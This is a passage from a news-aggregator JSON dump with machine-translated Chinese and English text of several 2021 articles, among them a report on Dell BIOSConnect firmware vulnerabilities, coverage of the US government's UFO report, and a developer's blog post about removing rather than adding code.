t\u5141\u8bb8\u9ed1\u5ba2\u5c06\u6076\u610f\u6234\u5c14\u56fa\u4ef6\u66f4\u65b0\u4e00\u6b21\u8c03\u6574\u5230\u6240\u6709\u7528\u6237\u3002\u4f46\u662f\uff0c\u5b83\u4eec\u53ef\u4ee5\u88ab\u5229\u7528\uff0c\u4ee5\u5355\u72ec\u5b9a\u4f4d\u53d7\u5bb3\u8005\u8bbe\u5907\uff0c\u5e76\u8f7b\u677e\u83b7\u5f97\u5bf9\u56fa\u4ef6\u7684\u8fdc\u7a0b\u63a7\u5236\u3002\u59a5\u534f\u8bbe\u5907\u548c\uff0339; S\u56fa\u4ef6\u53ef\u4ee5\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u5168\u9762\u63a7\u5236\u673a\u5668\uff0c\u56e0\u4e3a\u56fa\u4ef6\u534f\u8c03\u786c\u4ef6\u548c\u8f6f\u4ef6\uff0c\u5e76\u4f5c\u4e3a\u8ba1\u7b97\u673a\u7684\u524d\u5146\u548c\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002\n    \u201c\u8fd9\u662f\u4e00\u79cd\u653b\u51fb\uff0c\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u8fdb\u5165BIOS\uff0c\u201d\u5f15\u5bfc\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u57fa\u672c\u56fa\u4ef6\u662fEclypsium\u7814\u7a76\u5458Scott Scheberman\u8868\u793a\u3002 \u201c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u524d\u751a\u81f3\u9774\u5b50\uff0c\u4e86\u89e3\u53d1\u751f\u4e86\u4ec0\u4e48\uff0c\u653b\u51fb\u5df2\u7ecf\u53d1\u751f\u3002\u8fd9\u662f\u4e00\u4e2a\u60f3\u8981\u6301\u4e45\u6027\u7684\u653b\u51fb\u8005\u662f\u4e00\u79cd\u907f\u514d\uff0c\u5f3a\u5927\uff0c\u4ee4\u4eba\u671b\u7684\u8106\u5f31\u6027\u96c6\u5408\u3002\u201c\n \u4e00\u4e2a\u91cd\u8981\u7684\u8b66\u544a\u662f\u653b\u51fb\u8005\u65e0\u6cd5\u76f4\u63a5\u4ece\u5f00\u653e\u4e92\u8054\u7f51\u4e2d\u5229\u7528\u56db\u4e2a\u751f\u7269\u8fde\u63a5\u9519\u8bef\u3002\u4ed6\u4eec\u9700\u8981\u7acb\u8db3\u5230\u53d7\u5bb3\u8005\u8bbe\u5907\u7684\u5185\u90e8\u7f51\u7edc\u3002\u4f46\u7814\u7a76\u4eba\u5458\u5f3a\u8c03\uff0c\u5728\u56fa\u4ef6\u5c42\u9762\u7684\u6613\u7528\u6027\u548c\u7f3a\u4e4f\u76d1\u63a7\u6216\u8bb0\u5f55\u7684\u6613\u7528\u6027\u5c06\u4f7f\u8fd9\u4e9b\u6f0f\u6d1e\u5bf9\u9ed1\u5ba2\u5438\u5f15\u3002\u4e00\u65e6\u653b\u51fb\u8005\u906d\u5230\u59a5\u534f\u56fa\u4ef6\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5728\u76ee\u6807\u4e2d\u4fdd\u6301\u672a\u7ecf\u68c0\u6d4b\u7684\u957f\u671f\uff06\uff0339;\u7f51\u7edc\u3002 \nEclypsium\u7814\u7a76\u4eba\u5458\u54113\u67083\u65e5\u62ab\u9732\u4e86\u6234\u5c14\u7684\u8106\u5f31\u6027\u3002\u4ed6\u4eec\u5c06\u57288\u6708\u521d\u5728\u62c9\u65af\u7ef4\u52a0\u65af\u7684Defcon\u5b89\u5168\u4f1a\u8bae\u4e0a\u5c55\u793a\u5fb7\u56fd\u5b89\u5168\u4f1a\u8bae\u7684\u8c03\u67e5\u7ed3\u679c\u3002\n \u201cDell\u4fee\u590d\u4e86Dell Biosconnect\u7684\u591a\u4e2a\u6f0f\u6d1e\u548c\u4e00\u4e9b\u6234\u5c14\u5ba2\u6237\u5e73\u53f0\u63d0\u4f9b\u7684HTTPS\u5f15\u5bfc\u529f\u80fd\uff0c\uff06\uff0334;\u8be5\u516c\u53f8\u5728\u4e00\u4efd\u58f0\u660e\u4e2d\u8868\u793a\u3002 \u201c\u5982\u679c\u5ba2\u6237\u5df2\u6253\u5f00\u6234\u5c14\u81ea\u52a8\u66f4\u65b0\uff0c\u5219\u4f1a\u81ea\u52a8\u66f4\u65b0\u529f\u80fd\u3002\uff06\uff0334;\u5982\u679c\u6ca1\u6709\uff0c\u8be5\u516c\u53f8\u8868\u793a\u5ba2\u6237\u5e94\u8be5\u5728\u6700\u65e9\u7684\u65b9\u4fbf\u4e4b\u524d\u624b\u52a8\u5b89\u88c5\u8865\u4e01\u3002\u201c\n \u7136\u800c\uff0cEclypsium\u7814\u7a76\u4eba\u5458\u5c0f\u5fc3\uff0c\u8fd9\u662f\u4e00\u4e2a\u66f4\u65b0\uff0c\u60a8\u53ef\u80fd\u4e0d\u60f3\u81ea\u52a8\u4e0b\u8f7d\u3002\u7531\u4e8e\u751f\u7269\u8fde\u63a5\u672c\u8eab\u662f\u6613\u53d7\u653b\u51fb\u7684\u673a\u5236\uff0c\u56e0\u6b64\u83b7\u5f97\u66f4\u65b0\u7684\u6700\u5b89\u5168\u65b9\u6cd5\u662f\u5bfc\u822a\u5230Dell\uff06\uff0339; S\u9a71\u52a8\u7a0b\u5e8f\u548c\u4e0b\u8f7d\u7f51\u7ad9\u5e76\u624b\u52a8\u4e0b\u8f7d\u5e76\u4ece\u90a3\u91cc\u5b89\u88c5\u66f4\u65b0\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u666e\u901a\u7528\u6237\uff0c\u6700\u597d\u7684\u65b9\u6cd5\u662f\u7b80\u5355\u5730\u66f4\u65b0\u6234\u5c14\uff0c\u4f46\u662f\u60a8\u53ef\u4ee5\u5c3d\u5feb\u66f4\u65b0\u60a8\u7684\u6234\u5c14\u3002\n \u201c\u6211\u4eec\u770b\u5230\u4e86\u50cf\u903b\u8f91\u7f3a\u9677\u5728\u56fa\u4ef6\u5b89\u5168\u7684\u65b0\u7a7a\u95f4\u4e2d\u51fa\u73b0\u7684\u903b\u8f91\u7f3a\u9677\u76f8\u5bf9\u7b80\u5355\u7684\u8fd9\u4e9b\u9519\u8bef\uff0c\u201dEclypsium\uff06\uff0339;\u8fc8\u514b\u5c14\u8bf4\u3002 \u201c\u4f60\u76f8\u4fe1\u8fd9\u6240\u623f\u5b50\u5df2\u7ecf\u4ee5\u5b89\u5168\u7684\u65b9\u5f0f\u5efa\u9020\uff0c\u4f46\u5b9e\u9645\u4e0a\u5750\u5728\u6c99\u8d28\u57fa\u7840\u4e0a\u3002\uff06\uff0334;\n \u901a\u8fc7\u56fa\u4ef6\u4e0d\u5b89\u5168\u7684\u8bb8\u591a\u5669\u68a6\u653b\u51fb\u60c5\u666f\uff0c\u8fc8\u514b\u5c14\u547c\u5438\u3002 \u201c\u5bf9\u4e0d\u8d77\uff0c\u201d\u4ed6\u8bf4\u3002 \uff06\uff0334;\u6211\u53ef\u4ee5\u5486\u54ee\u8fd9\u4e2a\u3002\u201c ", "note_en": "Researchers have known for  years about security issues with the foundational computer code known as firmware. It&#39;s often  riddled with vulnerabilities, it&#39;s difficult to update with patches, and it&#39;s increasingly the  target of real-world attacks. Now a well-intentioned mechanism to easily update the firmware of Dell computers is itself vulnerable as the result of four rudimentary bugs. And  these vulnerabilities could be exploited to gain full access to target devices.\n The  new findings from researchers at the security firm Eclypsium affect 128 recent models of Dell computers, including desktops, laptops, and tablets. The researchers estimate that the vulnerabilities expose 30 million devices in total, and the exploits even work in models that incorporate  Microsoft&#39;s Secured-core PC protections\u2014a system specifically built to reduce firmware vulnerability. Dell is releasing patches for the flaws today.\n \u201cThese vulnerabilities are on easy mode to exploit. It\u2019s essentially like traveling back in time\u2014it\u2019s almost like the \u201990s again,\u201d says Jesse Michael, principal analyst at Eclypsium. \u201cThe industry has achieved all this maturity of security features in application and operating system-level code, but they&#39;re not following best practices in new firmware security features.\u201d\n The vulnerabilities show up in a Dell feature called BIOSConnect, which allows users to easily, and even automatically, download firmware updates. BIOSConnect is part of a broader Dell update and remote operating system management feature called SupportAssist, which has had its own share of  potentially problematic vulnerabilities. Update mechanisms are  valuable  targets for attackers, because they can be tainted to distribute malware.\n The four vulnerabilities the researchers discovered in BIOSConnect wouldn&#39;t allow hackers to seed malicious Dell firmware updates to all users at once. They could be exploited, though, to individually target victim devices and easily gain remote control of the firmware. Compromising a device&#39;s firmware can give attackers full control of the machine, because firmware coordinates hardware and software, and runs as a precursor to the computer&#39;s operating system and applications.\n    \u201cThis is an attack that lets an attacker go directly to the BIOS,\u201d the fundamental firmware used in the boot process, says Eclypsium researcher Scott Scheferman. \u201cBefore the operating system even boots and is aware of what\u2019s going on, the attack has already happened. It\u2019s an evasive, powerful, and desirable set of vulnerabilities for an attacker that wants persistence.\u201d\n One important caveat is that attackers couldn&#39;t directly exploit the four BIOSConnect bugs from the open internet. They need to have a foothold into the internal network of victim devices. But the researchers emphasize that the ease of exploitation and lack of monitoring or logging at the firmware level would make these vulnerabilities attractive to hackers. Once an attacker has compromised firmware, they can likely remain undetected long-term inside a target&#39;s networks.\n The Eclypsium researchers disclosed the vulnerabilities to Dell on March 3. They will present the findings at the Defcon security conference in Las Vegas at the beginning of August.\n \u201cDell remediated multiple vulnerabilities for Dell BIOSConnect and HTTPS Boot features available with some Dell Client platforms,&#34; the company said in a statement. \u201cThe features will be automatically updated if customers have  Dell auto-updates turned on.&#34; If not, the company says customers should manually install the patches \u201cat their earliest convenience.\u201d\n The Eclypsium researchers caution, though, that this is one update you may not want to download automatically. Since BIOSConnect itself is the vulnerable mechanism, the safest way to get the updates is to navigate to Dell&#39;s  Drivers and Downloads website and manually download and install the updates from there. For the average user, though, the best approach is to simply update your Dell however you can, as quickly as possible.\n \u201cWe\u2019re seeing these bugs that are relatively simple like logic flaws show up in the new space of firmware security,\u201d Eclypsium&#39;s Michael says. \u201cYou\u2019re trusting that this house has been built in a secure way, but it\u2019s actually sitting on a sandy foundation.&#34;\n After running through a number of nightmare attack scenarios from firmware insecurity, Michael takes a breath. \u201cSorry,\u201d he says. &#34;I can rant about this a lot.\u201d", "posttime": "2021-06-26 18:35:57", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "pc,feature,\u56fa\u4ef6", "title": "\u4e00\u4e2a\u826f\u597d\u7684\u610f\u4e49\uff0c\u7559\u4e0b\u4e86\u6570\u767e\u4e07\u6234\u5c14PC\u6613\u53d7\u653b\u51fb ", "title_en": "A well-meaning feature leaves millions of Dell PCs vulnerable", "transed": 1, "url": "https://arstechnica.com/information-technology/2021/06/a-well-meaning-feature-leaves-millions-of-dell-pcs-vulnerable/", "via": "", "real_tags": ["pc", "feature", "\u56fa\u4ef6"]}, {"category": "", "categoryclass": "", "imagename": "604199403b1c65e642681da55e771d43.jpeg", "infoid": 1068415, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7f8e\u56fd\u653f\u5e9c\u4e8e\u5468\u4e94\u53d1\u5e03\u4e86\u5176\u9ad8\u5ea6\u9884\u671f\u7684UFO\u62a5\u544a\uff0c\u6db5\u76d6\u4e86\u672a\u8bc6\u522b\u7684\u7a7a\u4e2d\u73b0\u8c61\uff08UAP\uff09\u3002\u5b83\u53ef\u80fd\u4f1a\u8ba9\u4eba\u4eec\u60f3\u8981\u3002\n  \u4eca\u5929\uff0cODNI\u63d0\u4ea4\u4e86\u5173\u4e8e\u672a\u8bc6\u522b\u7684\u7a7a\u4e2d\u73b0\u8c61\uff08UAP\uff09\u7684\u521d\u6b65\u62a5\u544a\uff0c\u8fd9\u4e9b\u62a5\u544a\u4e2d\u65ad\u4e86UAP\u5de5\u4f5c\u7ec4\u53d6\u5f97\u7684\u8fdb\u5c55\u3002\u9605\u8bfb\u6b64\u5904\u7684\u62a5\u544a\uff1ahttps://t.co/gjduf42xmr\n -  DNI\uff08@odnigov\uff09\u529e\u516c\u5ba4\uff08@odnigov\uff092021\u5e746\u670825\u65e5\n  \u56fd\u5bb6\u60c5\u62a5\u7f72\u7f72\u957f\uff08ODNI\uff09\u529e\u516c\u5ba4\u53d1\u5e03\u7684\u5206\u6790\u5ba1\u67e5\u4e86144\u4e2a\u5b9e\u4f8b\uff0c\u5176\u4e2d\u7f8e\u56fd\u519b\u961f\u57282004\u5e74\u81f32021\u5e74\u4e4b\u95f4\u9047\u5230\u4e86\u672a\u8ba4\u51fa\u7684\u7269\u4f53\u3002\n \u62a5\u544a\u6307\u51fa\uff0c\u7531\u4e8e\u201c\u9ad8\u8d28\u91cf\u62a5\u544a\u91cf\u6709\u9650\u201d\uff0c\u8c03\u67e5\u4eba\u5458\u4e0d\u80fd\u5c31UAP\u7684\u6027\u8d28\u6216\u610f\u56fe\u7ed3\u675f\u3002\n \u6839\u636e\u8c03\u67e5\u4eba\u5458\uff0c\u6ca1\u6709\u53ef\u7528\u8bc1\u636e\u5c06UAP\u8054\u7cfb\u5728\u5916\u56fd\u5bf9\u624b\u3002\u8be5\u62a5\u544a\u6ca1\u6709\u53c2\u8003\u5916\u661f\u751f\u547d\u3002\n \u5728144\u4e2a\u906d\u9047\u4e2d\uff0c\u8c03\u67e5\u4eba\u5458\u53ea\u80fd\u63d0\u4f9b\u4e00\u4e2a\u89e3\u91ca\uff1a\u4e00\u4e2a\u4ee4\u4eba\u504f\u8f6c\u7684\u5927\u578b\u6c14\u7403\u3002\u8c03\u67e5\u4eba\u5458\u8fd8\u8ba4\u4e3a\uff0c\u81ea\u7136\u73b0\u8c61\u53ef\u80fd\u81f3\u5c11\u89e3\u91ca\u81f3\u5c11\u4e00\u4e9b\u4e8b\u4ef6\u3002 \n\u62a5\u544a\u79f0\uff0c\u201c\u5728\u6709\u9650\u7684\u4e8b\u4ef6\u4e2d\uff0c\u636e\u62a5\u9053\uff0c\u636e\u62a5\u9053\uff0cUAP\u4f3c\u4e4e\u8868\u73b0\u51fa\u4e0d\u5bfb\u5e38\u7684\u98de\u884c\u7279\u5f81\u3002\u201d \u201c\u8fd9\u4e9b\u89c2\u5bdf\u53ef\u80fd\u662f\u4f20\u611f\u5668\u9519\u8bef\uff0c\u6b3a\u9a97\u6216\u89c2\u5bdf\u8005\u8bef\u89e3\u7684\u7ed3\u679c\uff0c\u5e76\u4e14\u9700\u8981\u989d\u5916\u7684\u4e25\u683c\u5206\u6790\u3002\u201d  \u8be5\u62a5\u544a\u901a\u8fc7\u8868\u660e\u672a\u8bc6\u522b\u7684\u7a7a\u4e2d\u73b0\u8c61\u7279\u9063\u90e8\u961f\uff08UAPTF\uff09\u53ef\u4ee5\u83b7\u5f97\u201c\u7814\u7a76\u548c\u5f00\u53d1\u7684\u989d\u5916\u8d44\u91d1\u201d\uff0c\u4ee5\u8fdb\u4e00\u6b65\u8c03\u67e5UAP\uff0c\u5982\u679c\u516c\u4f17\u5e0c\u671b\u6295\u5165\u66f4\u591a\u8d44\u6e90\u3002  UPTF\u4e8e\u53bb\u5e748\u6708\u7531\u56fd\u9632\u90e8\uff08DoD\uff09\u6210\u7acb\uff0c\u8c03\u67e5\u8d8a\u6765\u8d8a\u591a\u7684\u6709\u5173\u672a\u89e3\u91ca\u5bf9\u8c61\u7684\u62a5\u544a\u3002 ", "note_en": "The U.S. government released its highly-anticipated UFO  report on Friday, covering  Unidentified Aerial Phenomena (UAP). It may leave people wanting.\n  Today, ODNI submitted to Congress a preliminary report regarding Unidentified Aerial Phenomena (UAP) that relays the progress made by the UAP Task Force. Read the report here:  https://t.co/gjDUf42XMR\n\u2014 Office of the DNI (@ODNIgov)  June 25, 2021\n  The analysis, released by the Office of the Director of National Intelligence (ODNI), examined 144 instances in which U.S. military planes encountered unidentified objects between 2004 and 2021.\n The report stated that investigators could not come to a conclusion on the nature or intent of UAP due to the \u201climited amount of high-quality reporting.\u201d\n No available evidence, according to investigators, links the UAP to a foreign adversary. The report makes no reference whatsoever to extraterrestrial life.\n Of the 144 encounters, investigators were only able to offer an explanation for one: a large ballon that was deflating. Investigators also argued that natural phenomenon could likely explain at least some of the incidents.\n  \u201cIn a limited number of incidents, UAP reportedly appeared to exhibit unusual flight characteristics,\u201d the report says. \u201cThese observations could be the result of sensor errors, spoofing, or observer misperception and require additional rigorous analysis.\u201d\n In the end, the report concludes by suggesting that the Unidentified Aerial Phenomena Task Force (UAPTF) could receive \u201cadditional funding for research and development\u201d to further investigate UAP if the public wants to devote more resources to it.\n The UAPTF was set up by the Department of Defense (DOD) last August to investigate the growing number of reports concerning unexplained objects.", "posttime": "2021-06-26 18:35:32", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u9ad8\u5ea6,highly,\u62a5\u544a", "title": "\u653f\u5e9c\u7684\u9ad8\u5ea6\u9884\u671f\u7684UFO\u62a5\u544a\u662f\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u7684\u65e0\u804a ", "title_en": "The Government's Highly-Anticipated UFO Report Is Incredibly Boring", "transed": 1, "url": "https://www.dailydot.com/debug/ufo-report-incredibly-boring/", "via": "", "real_tags": ["\u9ad8\u5ea6", "highly", "\u62a5\u544a"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1068412, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u662f\u4e00\u4e2a\u661f\u671f\u516d\u65e9\u4e0a\u3002\u6211\u6b63\u5728\u770byoutube\uff06amp;\u5728YouTube\u4e0a\u770b\u5230\u4e86\u8fd9\u4e2a\u89c6\u9891\u3002\n  \u51e0\u5468\u524d\uff0c\u6211\u5728\u6211\u4eec\u7684\u4e00\u4e2a\u4ea7\u54c1\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2a\u5c0f\u8fb9\u7f18\u6848\u4f8b\u9519\u8bef\u3002\u5373\u4f7f\u5728\u5f00\u59cb\u89e3\u51b3\u95ee\u9898\u4e4b\u524d\uff0c\u6211\u4e5f\u77e5\u9053\u5b83\u5c06\u662f\u4e00\u884c\u4ee3\u7801\u66f4\u6539\u3002\u6240\u4ee5\u6211\u505a\u4e86\u8fd9\u4e2a\u4fee\u590d\u7a0b\u5e8f\u548camp;\u7b2c\u4e8c\u5929\u6765\u5230QA\u62a5\u544a\uff0c\u56e0\u4e3a\u90a3\u4e00\u884c\u6539\u53d8\u6211\u6240\u505a\u7684\uff0c\u6211\u4ecb\u7ecd\u4e864\u4e2a\u8fb9\u7f18\u6848\u4f8b\uff0c\u5bfc\u81f4\u4e00\u4e9b\u4e0d\u4e00\u81f4\u3002\u7136\u540e\u6211\u5f00\u59cb\u5c06\u8fd9\u4e9b\u95ee\u9898\u9010\u4e00\u4fee\u590d\uff0c\u51e0\u4e2a\u5c0f\u65f6\u540e\u6211\u8bbe\u6cd5\u4fee\u590d\u4e86\u6240\u6709\u5185\u5bb9\uff0c\u4f46\u5bf9\u73b0\u6709\u7ed3\u6784\u6709\u51e0\u4e2a\u66f4\u6539\u3002\u5176\u4e2d\u4e00\u4e9b\u65b0\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u4e3a\u65b9\u6cd5\u6dfb\u52a0\u4e86\u4e00\u4e2a\u53ef\u9009\u53c2\u6570\uff0c\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u72b6\u6001\u3002\n \u6211\u5f00\u59cb\u601d\u8003\u662f\u503c\u5f97\u6240\u6709\u8fd9\u4e9b\u65b0\u7684\u8865\u5145\u548camp;\u589e\u52a0\u4e86\u4e00\u4e2a\u5c0f\u8fb9\u7f18\u6848\u4f8b\u9519\u8bef\u7684\u590d\u6742\u6027\u3002\u51e0\u5206\u949f\u540e\uff0c\u6211\u6b63\u5728\u8003\u8651\u4e0e\u4ea7\u54c1\u56e2\u961f\u8fdb\u884c\u8c08\u5224\uff0c\u800c\u4e0d\u662f\u89e3\u51b3\u521d\u59cb\u8fb9\u7f18\u6848\u4f8b\u3002\u56e0\u4e3a\u5b83\u4e0d\u662f\u4e00\u4e2a\u5173\u952e\u7684\u9519\u8bef\u548camp;\u53ea\u5bfc\u81f4UI\u4e0d\u4e00\u81f4\u3002\n \u7136\u540e\u6211\u91cd\u65b0\u5ba1\u89c6\u4e86\u521d\u59cb\u9519\u8bef\uff06amp;\u4ece\u5934\u5f00\u59cb\u5f00\u59cb\u3002\u56e0\u4e3a\u73b0\u5728\u6211\u77e5\u9053\u5982\u679c\u6211\u505a\u4e00\u884c\u6539\u53d8\uff0c\u5b83\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u66f4\u591a\u7684\u8fb9\u7f18\u6848\u4f8b\uff0c\u6211\u91c7\u53d6\u4e86\u4e0d\u540c\u7684\u65b9\u6cd5\uff06amp;\u5728\u4e0d\u5f15\u5165\u4efb\u4f55\u8fb9\u7f18\u6848\u4f8b\u7684\u60c5\u51b5\u4e0b\uff0c\u7ba1\u7406\u521d\u59cb\u9519\u8bef\u3002\u6700\u91cd\u8981\u7684\u662f\u6ca1\u6709\u65b0\u7684\u5c40\u90e8\u53d8\u91cf\u6216\u65b9\u6cd5\u53c2\u6570\u66f4\u6539\u6216\u65b0\u72b6\u6001\u3002\u6211\u7ee7\u7eed\u8003\u8651\u90a3\u5929\u53d1\u751f\u7684\u4e8b\u60c5\u548camp;\u5373\u4f7f\u5b83\u6700\u7ec8\u7ed3\u675f\u4e86\uff0c\u6211\u5c31\u6709\u5f88\u9ad8\u7684\u673a\u4f1a\uff0c\u6211\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u989d\u5916\u7684\u53d8\u5316\u6765\u5b9e\u73b0\uff0c\u6ca1\u6709\u610f\u8bc6\u5230\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u3002\u6240\u4ee5\u5f53\u6211\u4eca\u5929\u65e9\u4e0a\u770b\u4e86\u8fd9\u4e2aYouTube\u89c6\u9891\u65f6\uff0c\u6211\u77e5\u9053\u8fd9\u4e0e\u6211\u53d1\u751f\u7684\u4e8b\u60c5\u5b8c\u5168\u76f8\u540c\u3002\u6211\u7ee7\u7eed\u5efa\u9020\u66f4\u591a\u7684\u788e\u7247\u800c\u4e0d\u5b9e\u73b0\u62c6\u5378\u7b2c\u4e00\u4ef6\u662f\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\n \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u79cd\u8111\u529f\u80fd\u8054\u7cfb\u5728\u8f6f\u4ef6\u5f00\u53d1\u4e2d\u6dfb\u52a0\u788e\u7247\u800c\u4e0d\u662f\u5220\u9664\u788e\u7247\u3002\u4f8b\u5982\uff0c\u5b58\u5728\u8fd9\u4e2a\u5e93A\uff0c\u5b83\u5728\u6267\u884cXYZ\u65f6\u6bd4\u6211\u4eec\u6b63\u5728\u4f7f\u7528\u7684\u5f53\u524d\u5e93B\u5f88\u591a\u3002\u6240\u4ee5\u6211\u4eec\u5f00\u59cb\u4f7f\u7528\u56fe\u4e66\u9986A\uff06amp;\u5b9e\u73b0\u56fe\u4e66\u9986A\u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u6267\u884cABC\u52a8\u4f5c\u7684\u901f\u5ea6\u6bd4\u56fe\u4e66\u9986B\u6162\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4ecb\u7ecd\u5e93C\u4ee5\u4f18\u5316\u5b83\u3002\u6709\u6848\u4f8b\u4ecd\u7136\u9075\u5faa\u8fd9\u8fde\u9501\u5229\u5c3c\u65af\u603b\u4f53\u3002\u4f46\u662f\u53ef\u80fd\u8fd8\u6709\u5176\u4ed6\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u6dfb\u52a0\u65b0\u56fe\u4e66\u9986\u3002\u5927\u591a\u6570\u65f6\u5019\u6211\u4eec\u9519\u8fc7\u4e86\u8fd9\u4e9b\u9009\u62e9\uff0c\u56e0\u4e3a\u6211\u4eec\u559c\u6b22\u6dfb\u52a0\u4e1c\u897f\u800c\u4e0d\u662f\u53bb\u9664\u3002\n \u53e6\u4e00\u4e2a\u4f8b\u5b50\u6211\u53ef\u4ee5\u60f3\u5230\uff08\u6709\u4e9b\u4eba\u4e0d\u540c\u610f\u8fd9\u4e2a\uff09\uff0c\u5e74\u524d\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684Web\u5e94\u7528\u7a0b\u5e8f\u52a8\u6001\u5730\u5448\u73b0HTML\uff06amp;\u6bcf\u6b21\u7528\u6237\u8f6c\u5230\u65b0\u9875\u9762\u65f6\u4e0d\u60f3\u5237\u65b0\u6574\u4e2a\u9875\u9762\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u7ee7\u7eed\u5efa\u7acb\u6211\u4eec\u7684\u524d\u7aef\u6846\u67b6\uff0c\u5341\u5e74\u540e\uff0c\u6211\u4eec\u52a0\u8f7d\u4e86\u5341\u4e07\u884c\u7684JavaScript\u6765\u524d\u7aef\u4e3aWeb\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u987a\u5229\uff06amp;\u4e0a\u5e1d\u77e5\u9053\u4ed6\u4eec\u7684\u6240\u4f5c\u6240\u4e3a\u3002 ", "note_en": "It was a Saturday morning. I was watching Youtube &amp; saw this video on Youtube.\n  Few week ago I was fixing a small edge case bug in one of our products. Even before starting to fix the issue, I knew it will be one line of code change. So I did the fix &amp; next day here come the QA report, because of that one line change I did, I have introduced 4 more edge cases which cause some inconsistancies. Then I started fixing those issues one by one, few hours later I managed to fix everything, but with several changes to the existing structure. In which there were few new local variables, added an optional parameter to a method, added one new state.\n I started thinking is it worth all these new additions &amp; added complexity for a small edge case bug. For few minutes I was thinking of negotiating with product team not to fix the initial edge case. Because it was not a critical bug &amp; only cause UI inconsistency.\n Then I revisited the initial bug &amp; started from the begining again. Because now I know if I do one line change it will introduce few more edge cases, I took a different approach &amp; managed to fix the initial bug without introducing any edge cases. Most importantly no new local variables or method parameter changes or new states. I continued thinking about what happened that day &amp; even though it ended up well, there was a high chance I could have gone with all additional changes without realising there was a better way. So when I watched this Youtube video today morning, I knew that is exactly the same thing happened to me. I continued building more pieces without realising removing the first piece is the better solution.\n So we can relate this brain function of adding pieces rather than removing pieces in software development. For example there is this library A, which is great at doing xyz than the current library B we are using. So we start using library A &amp; realise one of the drawbacks of library A is performing abc action is slower than Library B. So we introduce library C to optimise it. There are cases still follow this chain benifits overall. But there can be other possible solutions rather than keep adding new libraries. Most of the time we miss those options because we love adding things rather than removing.\n One more example I can think of (some of you will not agree with this), years ago we wanted our web applications to render html dynamically &amp; didn\u2019t want to refresh whole page everytime user go to a new page. So we keep building our frontend frameworks, decade later we load hundred thousand lines of javascript to frontend for a web application to run smoothly &amp; god knows what they do.", "posttime": "2021-06-26 18:24:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8f6f\u4ef6,software,amp", "title": "\u901a\u8fc7\u6dfb\u52a0\u66f4\u591a\u89e3\u51b3\u8f6f\u4ef6\u95ee\u9898 ", "title_en": "Solve software problems by adding more", "transed": 1, "url": "https://dilumn.github.io/programming/2021/06/26/Solve-software-problems-by-adding-more/", "via": "", "real_tags": ["\u8f6f\u4ef6", "software", "amp"]}, {"category": "", "categoryclass": "", "imagename": "fcf135c075826279501c6605c3a4492e.jpeg", "infoid": 1068411, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8f6f\u4ef6\u5f00\u53d1\u4e2d\u6700\u56f0\u96be\u7684\u4e8b\u60c5\u662f\u547d\u540d\u3002\u547d\u540d\u4ea7\u54c1\uff0c\u8303\u5f0f\u548c\u4ee3\u7801\u7684\u90e8\u5206\u3002\u547d\u540d\u7684\u539f\u56e0\u662f\u8270\u96be\u800c\u91cd\u8981\u7684\u662f\uff0c\u5b83\u662f\u4e00\u79cd\u6c9f\u901a\u884c\u4e3a;\u6ca1\u6709\u597d\u7684\u540d\u5b57\uff0c\u4f60\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5199\u5165\uff0c\u55ef\uff0c\u4ee3\u7801\u3002\u4e00\u4e2a\u540d\u79f0\u4e0d\u4ec5\u4ec5\u662f\u6807\u7b7e\uff1a\u5b83\u901a\u77e5\u5e76\u6307\u5bfc\u8bfb\u8005\u7684\u5fc3\u7406\u6a21\u578b\u3002\u540d\u79f0\u53ef\u4ee5\u6539\u53d8\u8bfb\u8005\u601d\u8003\u7684\u65b9\u5f0f\u3002\u4e00\u4e2a\u597d\u540d\u5b57\u662f\u4e00\u5206\u4eab\u601d\u60f3;\u4e00\u4e2a\u7cdf\u7cd5\u7684\u540d\u5b57\u662f\u4e00\u4e2a\u9519\u8fc7\u7684\u5b66\u4e60\u673a\u4f1a\uff0c\u8bf4\u51fa\u6211\u4eec\u7684\u610f\u601d\u3002\n 